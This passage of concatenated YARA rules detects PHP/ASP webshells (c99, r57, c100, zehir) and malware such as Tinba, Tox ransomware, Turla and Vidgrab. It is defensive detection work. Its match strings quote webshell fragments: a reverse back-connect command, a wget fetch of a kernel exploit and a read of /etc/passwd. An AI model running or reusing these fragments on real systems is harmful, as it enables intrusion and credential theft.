		hash10 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
	strings:
		$s4 = "if (!empty($unset_surl)) {setcookie(\"c99sh_surl\"); $surl = \"\";}" fullword ascii
		$s6 = "@extract($_REQUEST[\"c99shcook\"]);" fullword ascii
		$s7 = "if (!function_exists(\"c99_buff_prepare\"))" fullword ascii
	condition:
		filesize < 685KB and 1 of them
}

rule Webshell_acid_AntiSecShell_3 {
	meta:
		description = "Detects Webshell Acid"
		author = "Florian Roth"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
		hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
		hash3 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
		hash4 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
		hash5 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
		hash6 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
		hash7 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
		hash8 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
		hash9 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
		hash10 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
		hash11 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
		hash12 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
		hash13 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
		hash14 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
		hash15 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
		hash16 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
		hash17 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
		hash18 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"
	strings:
		$s0 = "echo \"<option value=delete\".($dspact == \"delete\"?\" selected\":\"\").\">Delete</option>\";" fullword ascii
		$s1 = "if (!is_readable($o)) {return \"<font color=red>\".view_perms(fileperms($o)).\"</font>\";}" fullword ascii
	condition:
		filesize < 900KB and all of them
}

rule Webshell_c99_4 {
	meta:
		description = "Detects C99 Webshell"
		author = "Florian Roth"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
		hash2 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
		hash3 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
		hash4 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
		hash5 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
		hash6 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
		hash7 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
		hash8 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
		hash9 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
		hash10 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
		hash11 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
		hash12 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
		hash13 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
		hash14 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"
	strings:
		$s1 = "displaysecinfo(\"List of Attributes\",myshellexec(\"lsattr -a\"));" fullword ascii
		$s2 = "displaysecinfo(\"RAM\",myshellexec(\"free -m\"));" fullword ascii
		$s3 = "displaysecinfo(\"Where is perl?\",myshellexec(\"whereis perl\"));" fullword ascii
		$s4 = "$ret = myshellexec($handler);" fullword ascii
		$s5 = "if (posix_kill($pid,$sig)) {echo \"OK.\";}" fullword ascii
	condition:
		filesize < 900KB and 1 of them
}

rule Webshell_r57shell_2 {
	meta:
		description = "Detects Webshell R57"
		author = "Florian Roth"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
		hash2 = "aa957ca4154b7816093d667873cf6bdaded03f820e84d8f1cd5ad75296dd5d4d"
		hash3 = "aa957ca4154b7816093d667873cf6bdaded03f820e84d8f1cd5ad75296dd5d4d"
		hash4 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
		hash5 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
		hash6 = "16b6ec4b80f404f4616e44d8c21978dcdad9f52c84d23ba27660ee8e00984ff2"
		hash7 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
		hash8 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
		hash9 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
		hash10 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
		hash11 = "59ea6cf16ea06ff47cf0e6a398df2eaec4d329707b8c3201fc63cbf0b7c85519"
		hash12 = "0e0227a0001b38fb59fc07749e80c9d298ff0e6aca126ea8f4ea68ebc9a3661f"
		hash13 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
	strings:
		$s1 = "$connection = @ftp_connect($ftp_server,$ftp_port,10);" fullword ascii
		$s2 = "echo $lang[$language.'_text98'].$suc.\"\\r\\n\";" fullword ascii
	condition:
		filesize < 900KB and all of them
}

rule Webshell_27_9_acid_c99_locus7s {
	meta:
		description = "Detects Webshell - rule generated from from files 27.9.txt, acid.php, c99_locus7s.txt"
		author = "Florian Roth"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
		hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
		hash3 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
		hash4 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
		hash5 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
		hash6 = "5ae121f868555fba112ca2b1a9729d4414e795c39d14af9e599ce1f0e4e445d3"
		hash7 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
		hash8 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
	strings:
		$s0 = "$blah = ex($p2.\" /tmp/back \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
		$s1 = "$_POST['backcconnmsge']=\"</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>\";" fullword ascii
	condition:
		filesize < 1711KB and 1 of them
}

rule Webshell_Backdoor_PHP_Agent_r57_mod_bizzz_shell_r57 {
	meta:
		description = "Detects Webshell - rule generated from from files Backdoor.PHP.Agent.php, r57.mod-bizzz.shell.txt ..."
		author = "Florian Roth"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
		hash2 = "f51a5c5775d9cca0b137ddb28ff3831f4f394b7af6f6a868797b0df3dcdb01ba"
		hash3 = "16b6ec4b80f404f4616e44d8c21978dcdad9f52c84d23ba27660ee8e00984ff2"
		hash4 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
		hash5 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
		hash6 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
		hash7 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
		hash8 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
		hash9 = "59ea6cf16ea06ff47cf0e6a398df2eaec4d329707b8c3201fc63cbf0b7c85519"
		hash10 = "0e0227a0001b38fb59fc07749e80c9d298ff0e6aca126ea8f4ea68ebc9a3661f"
		hash11 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
	strings:
		$s1 = "$_POST['cmd'] = which('" ascii
		$s2 = "$blah = ex(" fullword ascii
	condition:
		filesize < 600KB and all of them
}

rule Webshell_c100 {
	meta:
		description = "Detects Webshell - rule generated from from files c100 v. 777shell"
		author = "Florian Roth"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
		hash2 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
		hash3 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
		hash4 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
		hash5 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
		hash6 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
		hash7 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
	strings:
		$s0 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)" fullword ascii
		$s1 = "<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\">" fullword ascii
		$s3 = "cut -d: -f1,2,3 /etc/passwd | grep ::" ascii
		$s4 = "which wget curl w3m lynx" ascii
		$s6 = "netstat -atup | grep IST"  ascii
	condition:
		filesize < 685KB and 2 of them
}

rule Webshell_AcidPoison {
	meta:
		description = "Detects Poison Sh3ll - Webshell"
		author = "Florian Roth"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
		hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
		hash3 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
		hash4 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
		hash5 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
		hash6 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
		hash7 = "be541cf880a8e389a0767b85f1686443f35b508d1975ee25e1ce3f08fa32cfb5"
		hash8 = "be541cf880a8e389a0767b85f1686443f35b508d1975ee25e1ce3f08fa32cfb5"
		hash9 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
		hash10 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
	strings:
		$s1 = "elseif ( enabled(\"exec\") ) { exec($cmd,$o); $output = join(\"\\r\\n\",$o); }" fullword ascii
	condition:
		filesize < 550KB and all of them
}

rule Webshell_acid_FaTaLisTiCz_Fx_fx_p0isoN_sh3ll_x0rg_byp4ss_256 {
	meta:
		description = "Detects Webshell - rule generated from from files acid.php, FaTaLisTiCz_Fx.txt, fx.txt, p0isoN.sh3ll.txt, x0rg.byp4ss.txt"
		author = "Florian Roth"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
		hash2 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
		hash3 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
		hash4 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
		hash5 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"
	strings:
		$s0 = "<form method=\"POST\"><input type=hidden name=act value=\"ls\">" fullword ascii
		$s2 = "foreach($quicklaunch2 as $item) {" fullword ascii
	condition:
		filesize < 882KB and all of them
}

rule Webshell_Ayyildiz {
	meta:
		description = "Detects Webshell - rule generated from from files Ayyildiz Tim  -AYT- Shell v 2.1 Biz.txt, Macker's Private PHPShell.php, matamu.txt, myshell.txt, PHP Shell.txt"
		author = "Florian Roth"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "0e25aec0a9131e8c7bd7d5004c5c5ffad0e3297f386675bccc07f6ea527dded5"
		hash2 = "9c43aada0d5429f8c47595f79a7cdd5d4eb2ba5c559fb5da5a518a6c8c7c330a"
		hash3 = "2ebf3e5f5dde4a27bbd60e15c464e08245a35d15cc370b4be6b011aa7a46eaca"
		hash4 = "77a63b26f52ba341dd2f5e8bbf5daf05ebbdef6b3f7e81cec44ce97680e820f9"
		hash5 = "61c4fcb6e788c0dffcf0b672ae42b1676f8a9beaa6ec7453fc59ad821a4a8127"
	strings:
		$s0 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"), 1)) .\"\\\">Parent Directory</option>\\n\";" fullword ascii
		$s1 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";" fullword ascii
	condition:
		filesize < 112KB and all of them
}

rule Webshell_zehir {
	meta:
		description = "Detects Webshell - rule generated from from files elmaliseker.asp, zehir.asp, zehir.txt, zehir4.asp, zehir4.txt"
		author = "Florian Roth"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "16e1e886576d0c70af0f96e3ccedfd2e72b8b7640f817c08a82b95ff5d4b1218"
		hash2 = "0c5f8a2ed62d10986a2dd39f52886c0900a18c03d6d279207b8de8e2ed14adf6"
		hash3 = "cb9d5427a83a0fc887e49f07f20849985bd2c3850f272ae1e059a08ac411ff66"
		hash4 = "b57bf397984545f419045391b56dcaf7b0bed8b6ee331b5c46cee35c92ffa13d"
		hash5 = "febf37a9e8ba8ece863f506ae32ad398115106cc849a9954cbc0277474cdba5c"
	strings:
		$s1 = "for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';" fullword ascii
		$s2 = "if (frmUpload.max.value<=0) frmUpload.max.value=1;" fullword ascii
	condition:
		filesize < 200KB and 1 of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.

*/

rule Tinba2 {
        meta:
                author = "n3sfox <n3sfox@gmail.com>"
                date = "2015/11/07"
                description = "Tinba 2 (DGA) banking trojan"
                reference = "https://securityintelligence.com/tinba-malware-reloaded-and-attacking-banks-around-the-world"
                filetype = "memory"
                hash1 = "c7f662594f07776ab047b322150f6ed0"
                hash2 = "dc71ef1e55f1ddb36b3c41b1b95ae586"
                hash3 = "b788155cb82a7600f2ed1965cffc1e88"

        strings:
                $str1 = "MapViewOfFile"
                $str2 = "OpenFileMapping"
                $str3 = "NtCreateUserProcess"
                $str4 = "NtQueryDirectoryFile"
                $str5 = "RtlCreateUserThread"
                $str6 = "DeleteUrlCacheEntry"
                $str7 = "PR_Read"
                $str8 = "PR_Write"
                $pubkey = "BEGIN PUBLIC KEY"
                $code1 = {50 87 44 24 04 6A ?? E8}

        condition:
                all of ($str*) and $pubkey and $code1
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"


rule Win32Toxic : tox ransomware
{
meta:
	author = "@GelosSnake"
	date = "2015-06-02"
	description = "https://blogs.mcafee.com/mcafee-labs/meet-tox-ransomware-for-the-rest-of-us"
	hash0 = "70624c13be4d8a4c1361be38b49cb3eb"
	hash1 = "4f20d25cd3ae2e5c63d451d095d97046"
	hash2 = "e0473434cc83b57c4b579d585d4c4c57"
	hash3 = "c52090d184b63e5cc71b524153bb079e"
	hash4 = "7ac0b49baba9914b234cde62058c96a5"
	hash5 = "048c007de4902b6f4731fde45fa8e6a9"
	hash6 = "238ef3e35b14e304c87b9c62f18953a9"
	hash7 = "8908ccd681f66429c578a889e6e708e1"
	hash8 = "de9fe2b7d9463982cc77c78ee51e4d51"
	hash9 = "37add8d26a35a3dc9700b92b67625fa4"
	hash10 = "a0f30e89a3431fca1d389f90dba1d56e"
	hash11 = "d4d0658302c731003bf0683127618bd9"
	hash12 = "d1d89e1c7066f41c1d30985ac7b569db"
	hash13 = "97d52d7281dfae8ff9e704bf30ce2484"
	hash14 = "2cc85be01e86e0505697cf61219e66da"
	hash15 = "02ecfb44b9b11b846ea8233d524ecda3"
	hash16 = "703a6ebe71131671df6bc92086c9a641"
	hash17 = "df23629b4a4aed05d6a453280256c05a"
	hash18 = "07466ff2572f16c63e1fee206b081d11"
	hash19 = "792a1c0971775d32bad374b288792468"
	hash20 = "fb7fd5623fa6b7791a221fad463223cd"
	hash21 = "83a562aab1d66e5d170f091b2ae6a213"
	hash22 = "99214c8c9ff4653b533dc1b19a21d389"
	hash23 = "a92aec198eee23a3a9a145e64d0250ee"
	hash24 = "e0f7e6b96ca72b9755965b9dac3ce77e"
	hash25 = "f520fc947a6d5edb87aa01510bee9c8d"
	hash26 = "6d7babbe5e438539a9fa2c5d6128d3b4"
	hash27 = "3133c2231fcee5d6b0b4c988a5201da1"
	hash28 = "e5b1d198edc413376e0c0091566198e4"
	hash29 = "50515b5a6e717976823895465d5dc684"
	hash30 = "510389e8c7f22f2076fc7c5388e01220"
	hash31 = "60573c945aa3b8cfaca0bdb6dd7d2019"
	hash32 = "394187056697463eba97382018dfe151"
	hash33 = "045a5d3c95e28629927c72cf3313f4cd"
	hash34 = "70951624eb06f7db0dcab5fc33f49127"
	hash35 = "5def9e3f7b15b2a75c80596b5e24e0f4"
	hash36 = "35a42fb1c65ebd7d763db4abb26d33b0"
	hash37 = "b0030f5072864572f8e6ba9b295615fc"
	hash38 = "62706f48689f1ba3d1d79780010b8739"
	hash39 = "be86183fa029629ee9c07310cd630871"
	hash40 = "9755c3920d3a38eb1b5b7edbce6d4914"
	hash41 = "cb42611b4bed97d152721e8db5abd860"
	hash42 = "5475344d69fc6778e12dc1cbba23b382"
	hash43 = "8c1bf70742b62dec1b350a4e5046c7b6"
	hash44 = "6a6541c0f63f45eff725dec951ec90a7"
	hash45 = "a592c5bee0d81ee127cbfbcb4178afe8"
	hash46 = "b74c6d86ec3904f4d73d05b2797f1cc3"
	hash47 = "28d76fd4dd2dbfc61b0c99d2ad08cd8e"
	hash48 = "fc859ae67dc1596ac3fdd79b2ed02910"
	hash49 = "cb65d5e929da8ff5c8434fd8d36e5dfb"
	hash50 = "888dd1acce29cd37f0696a0284ab740a"
	hash51 = "0e3e231c255a5eefefd20d70c247d5f0"
	hash52 = "e5ebe35d934106f9f4cebbd84e04534b"
	hash53 = "3b580f1fa0c961a83920ce32b4e4e86d"
	hash54 = "d807a704f78121250227793ea15aa9c4"
	hash55 = "db462159bddc0953444afd7b0d57e783"
	hash56 = "2ed4945fb9e6202c10fad0761723cb0e"
	hash57 = "51183ab4fd2304a278e36d36b5fb990c"
	hash58 = "65d602313c585c8712ea0560a655ddeb"
	hash59 = "0128c12d4a72d14bb67e459b3700a373"
	hash60 = "5d3dfc161c983f8e820e59c370f65581"
	hash61 = "d4dd475179cd9f6180d5b931e8740ed6"
	hash62 = "5dd3782ce5f94686448326ddbbac934c"
	hash63 = "c85c6171a7ff05d66d497ad0d73a51ed"
	hash64 = "b42dda2100da688243fe85a819d61e2e"
	hash65 = "a5cf8f2b7d97d86f4d8948360f3db714"
	hash66 = "293cae15e4db1217ea72581836a6642c"
	hash67 = "56c3a5bae3cb1d0d315c1353ae67cf58"
	hash68 = "c86dc1d0378cc0b579a11d873ac944e7"
	hash69 = "54cef0185798f3ec1f4cb95fad4ddd7c"
	hash70 = "eb2eff9838043b67e8024ccadcfe1a8f"
	hash71 = "78778fe62ee28ef949eec2e7e5961ca8"
	hash72 = "e75c5762471a490d49b79d01da745498"
	hash73 = "1564d3e27b90a166a0989a61dc3bd646"
	hash74 = "59ba111403842c1f260f886d69e8757d"
	hash75 = "d840dfbe52a04665e40807c9d960cccc"
	hash76 = "77f543f4a8f54ecf84b15da8e928d3f9"
	hash77 = "bd9512679fdc1e1e89a24f6ebe0d5ad8"
	hash78 = "202f042d02be4f6469ed6f2e71f42c04"
	hash79 = "28f827673833175dd9094002f2f9b780"
	hash80 = "0ff10287b4c50e0d11ab998a28529415"
	hash81 = "644daa2b294c5583ce6aa8bc68f1d21f"
	hash82 = "1c9db47778a41775bbcb70256cc1a035"
	hash83 = "c203bc5752e5319b81cf1ca970c3ca96"
	hash84 = "656f2571e4f5172182fc970a5b21c0e7"
	hash85 = "c17122a9864e3bbf622285c4d5503282"
	hash86 = "f9e3a9636b45edbcef2ee28bd6b1cfbb"
	hash87 = "291ff8b46d417691a83c73a9d3a30cc9"
	hash88 = "1217877d3f7824165bb28281ccc80182"
	hash89 = "18419d775652f47a657c5400d4aef4a3"
	hash90 = "04417923bf4f2be48dd567dfd33684e2"
	hash91 = "31efe902ec6a5ab9e6876cfe715d7c84"
	hash92 = "a2e4472c5097d7433b91d65579711664"
	hash93 = "98854d7aba1874c39636ff3b703a1ed1"
	hash94 = "5149f0e0a56b33e7bbed1457aab8763f"
	hash95 = "7a4338193ce12529d6ae5cfcbb1019af"
	hash96 = "aa7f37206aba3cbe5e11d336424c549a"
	hash97 = "51cad5d45cdbc2940a66d044d5a8dabf"
	hash98 = "85edb7b8dee5b60e3ce32e1286207faa"
	hash99 = "34ca5292ae56fea78ba14abe8fe11f06"
	hash100 = "154187f07621a9213d77a18c0758960f"
	hash101 = "4e633f0478b993551db22afddfa22262"
	hash102 = "5c50e4427fe178566cada96b2afbc2d4"
	hash103 = "263001ac21ef78c31f4ca7ad2e7f191d"
	hash104 = "53fd9e7500e3522065a2dabb932d9dc5"
	hash105 = "48043dc55718eb9e5b134dac93ebb5f6"
	hash106 = "ca19a1b85363cfed4d36e3e7b990c8b6"
	hash107 = "41b5403a5443a3a84f0007131173c126"
	hash108 = "6f3833bc6e5940155aa804e58500da81"
	hash109 = "9bd50fcfa7ca6e171516101673c4e795"
	hash110 = "6d52ba0d48d5bf3242cd11488c75b9a7"
	hash111 = "c52afb663ff4165e407f53a82e34e1d5"
	hash112 = "5a16396d418355731c6d7bb7b21e05f7"
	hash113 = "05559db924e71cccee87d21b968d0930"
	hash114 = "824312bf8e8e7714616ba62997467fa8"
	hash115 = "dfec435e6264a0bfe47fc5239631903c"
	hash116 = "3512e7da9d66ca62be3418bead2fb091"
	hash117 = "7ad4df88db6f292e7ddeec7cf63fa2bc"
	hash118 = "d512da73d0ca103df3c9e7c074babc99"
	hash119 = "c622b844388c16278d1bc768dcfbbeab"
	hash120 = "170ffa1cd19a1cecc6dae5bdd10efb58"
	hash121 = "3a19c91c1c0baa7dd4a9def2e0b7c3e9"
	hash122 = "3b7ce3ceb8d2b85ab822f355904d47ce"
	hash123 = "a7bac2ace1f04a7ad440bd2f5f811edc"
	hash124 = "66594a62d8c98e1387ec8deb3fe39431"
	hash125 = "a1add9e5d7646584fd4140528d02e4c3"
	hash126 = "11328bbf5a76535e53ab35315321f904"
	hash127 = "048f19d79c953e523675e96fb6e417a9"
	hash128 = "eb65fc2922eafd62defd978a3215814b"
	hash129 = "51cc9987f86a76d75bf335a8864ec250"
	hash130 = "a7f91301712b5a3cc8c3ab9c119530ce"
	hash131 = "de976a5b3d603161a737e7b947fdbb9a"
	hash132 = "288a3659cc1aec47530752b3a31c232b"
	hash133 = "91da679f417040558059ccd5b1063688"
	hash134 = "4ce9a0877b5c6f439f3e90f52eb85398"
	hash135 = "1f9e097ff9724d4384c09748a71ef99d"
	hash136 = "7d8a64a94e71a5c24ad82e8a58f4b7e6"
	hash137 = "db119e3c6b57d9c6b739b0f9cbaeb6fd"
	hash138 = "52c9d25179bf010a4bb20d5b5b4e0615"
	hash139 = "4b9995578d51fb891040a7f159613a99"
	sample_filetype = "exe"
	yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
	$string0 = "n:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t:;;t;<<t;<<t;<<t;<<t;<<t;<<t;<<t;<<t<<<t;<<t;<<t;<<"
	$string1 = "t;<<t;<<t<<<t<<"
	$string2 = ">>><<<"
condition:
	2 of them
}

        
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule WaterBug_turla_dll 
{
    meta:
        description = "Symantec Waterbug Attack - Trojan Turla DLL"
        author = "Symantec Security Response"
        date = "22.01.2015"
        reference = "http://www.symantec.com/connect/blogs/turla-spying-tool-targets-governments-and-diplomats"   

    strings:
        $a = /([A-Za-z0-9]{2,10}_){,2}Win32\.dll\x00/
   
    condition:
        pe.exports("ee") and $a
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule urausy_skype_dat {
	meta:
		author = "AlienVault Labs"
		description = "Yara rule to match against memory of processes infected by Urausy skype.dat"
	strings:
		$a = "skype.dat" ascii wide
		$b = "skype.ini" ascii wide
		$win1 = "CreateWindow"
		$win2 = "YIWEFHIWQ" ascii wide
		$desk1 = "CreateDesktop"
		$desk2 = "MyDesktop" ascii wide
	condition:
		$a and $b and (all of ($win*) or all of ($desk*))
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule VidgrabCode : Vidgrab Family 
{
    meta:
        description = "Vidgrab code tricks"
        author = "Seth Hardy"
        last_modified = "2014-06-20"
        
    strings:
        $divbyzero = { B8 02 00 00 00 48 48 BA 02 00 00 00 83 F2 02 F7 F0 }
        // add eax, ecx; xor byte ptr [eax], ??h; inc ecx
        $xorloop = { 03 C1 80 30 (66 | 58) 41 }
        $junk = { 8B 4? ?? 8B 4? ?? 03 45 08 52 5A }
        
    condition:
        all of them
}

rule VidgrabStrings : Vidgrab Family
{
    meta:
        description = "Vidgrab Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-20"
        
    strings:
        $ = "IDI_ICON5" wide ascii
        $ = "starter.exe"
        $ = "wmifw.exe"
        $ = "Software\\malware_rar"
        $ = "tmp092.tmp"
        $ = "temp1.exe"
        
    condition:
       3 of them
}

rule Vidgrab : Family
{
    meta:
        description = "Vidgrab"
        author = "Seth Hardy"
        last_modified = "2014-06-20"
        
    condition:
        VidgrabCode or VidgrabStrings
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule NionSpy
{
meta:
description = "Triggers on old and new variants of W32/NionSpy file infector"
reference = "https://blogs.mcafee.com/mcafee-labs/taking-a-close-look-at-data-stealing-nionspy-file-infector"
strings:
$variant2015_infmarker = "aCfG92KXpcSo4Y94BnUrFmnNk27EhW6CqP5EnT"
$variant2013_infmarker = "ad6af8bd5835d19cc7fdc4c62fdf02a1"
$variant2013_string = "%s?cstorage=shell&comp=%s"
condition:
uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 1 of ($variant*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule Wabot : Worm
{
	meta:
		author="Kevin Falcoz"
		date="14/08/2015"
		description="Wabot Trojan Worm"

	strings:
		$signature1={43 3A 5C 6D 61 72 69 6A 75 61 6E 61 2E 74 78 74}
		$signature2={73 49 52 43 34}

	condition:
		$signature1 and $signature2
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule WarpCode : Warp Family 
{
    meta:
        description = "Warp code features"
        author = "Seth Hardy"
        last_modified = "2014-07-10"
    
    strings:
        // character replacement
        $ = { 80 38 2B 75 03 C6 00 2D 80 38 2F 75 03 C6 00 5F }
    
    condition:
        any of them
}

rule WarpStrings : Warp Family
{
    meta:
        description = "Warp Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-07-10"
        
    strings:
        $ = "/2011/n325423.shtml?"
        $ = "wyle"
        $ = "\\~ISUN32.EXE"

    condition:
       any of them
}

rule Warp : Family
{
    meta:
        description = "Warp"
        author = "Seth Hardy"
        last_modified = "2014-07-10"
        
    condition:
        WarpCode or WarpStrings
}
/*
